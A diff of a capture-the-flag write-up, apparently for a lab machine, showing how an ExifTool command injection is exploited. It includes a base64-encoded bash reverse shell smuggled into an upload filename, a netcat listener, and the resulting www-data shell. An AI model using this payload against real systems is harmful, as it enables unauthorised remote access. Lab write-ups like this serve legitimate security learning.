@@ -45,26 +45,25 @@ Now the smart thing here is that the exif output is outputted to a txt file mean
 When uploading a normal image you can see the exiftool version `ExifTool Version Number  : 12.37` a quick google search and you can see there is a command injection vulnerability that includes the |(pipe) symbol, https://gist.github.com/ert-plus/1414276e4cb5d56dd431c2f0429e4429 so I tried to do some stuff like I don't know maybe get a shell. So thats exactly what I'm going to do. In order to get a shell on the machine you need to do as follows:
 1. First you want to encode your command with base64. 
    
-   ```
    
+  ```
     $ echo "bash -i >& /dev/tcp/HOST/PORT 0>&1" | bash64
     YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC44OC85MDk5IDA+JjEK
+  ``` 
    
-   ```
    
 2. We can obtain a reverse shell by intercepting image upload POST request with Burp and changing the filename **don't forget to open a netcat listener before entering this request**:
    
-   ```
    
-   filename="$(echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC44OC85MDk5IDA+JjEK | base64 -d | bash) |"
+  ``` 
+    filename="$(echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC44OC85MDk5IDA+JjEK | base64 -d | bash) |"
+  ``` 
    
-   ```
 
 
 3. Get a shell:
    
-   ```
-
+  ```
    $ nc -lnvp 9099                  
     listening on [any] 9099 ...
     connect to [10.10.14.88] from (UNKNOWN) [10.10.11.197] 32898
@@ -76,8 +75,7 @@ When uploading a normal image you can see the exiftool version `ExifTool Version
     www-data@investigation:~/uploads/1676742128$ python3 -c 'import pty;pty.spawn("/bin/bash")'
     <128$ python3 -c 'import pty;pty.spawn("/bin/bash")'
     www-data@investigation:~/uploads/1676742128$
-
-   ```
+  ```
 
 
 Now lets see our available users:
